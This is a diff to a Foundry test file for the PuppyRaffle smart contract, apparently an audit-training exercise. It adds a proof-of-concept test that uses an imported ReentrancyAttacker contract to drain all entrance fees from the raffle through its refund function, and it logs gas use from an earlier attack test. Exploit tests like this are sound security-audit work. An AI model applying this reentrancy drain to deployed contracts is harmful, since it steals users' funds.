@@ -4,9 +4,12 @@ pragma experimental ABIEncoderV2;
 
 import {Test, console} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
+import {ReentrancyAttacker} from "../src/ReentrancyAttacker.sol";
 
 contract PuppyRaffleTest is Test {
     PuppyRaffle puppyRaffle;
+    ReentrancyAttacker reentrancyAttacker;
+
     uint256 entranceFee = 1e18;
     address playerOne = address(1);
     address playerTwo = address(2);
@@ -247,6 +250,28 @@ contract PuppyRaffleTest is Test {
         console.log("initial gas used:", initialGasUsed);
         console.log("post attack gas used:", PostAttackGasUsed);
         console.log("gas used incresed in a factor of aprox.", PostAttackGasUsed/initialGasUsed, " after attack");
+    }
+
+    function test_ReentrancyAttackOnRefund() public {
+        // setup attacker 
+        reentrancyAttacker = new ReentrancyAttacker(address(puppyRaffle));
+        reentrancyAttacker.fundAttacker{ value: entranceFee }();
+
+        // register some users to have eth on the victim contract 
+        uint256 playersToAdd = 10;
+        address[] memory Players = new address[](playersToAdd);
+        for(uint256 i = 0; i<Players.length; i++) {
+            Players[i] = address(i+1);
+        }
+        puppyRaffle.enterRaffle{ value: entranceFee * playersToAdd }(Players);
+
+        // perform the attack 
+        reentrancyAttacker.attack();
+        console.log(address(puppyRaffle).balance);
+        console.log(address(reentrancyAttacker).balance);
+
+        assert(address(puppyRaffle).balance==0);
+        assert(address(reentrancyAttacker).balance== entranceFee * playersToAdd + entranceFee);
     }
 
 
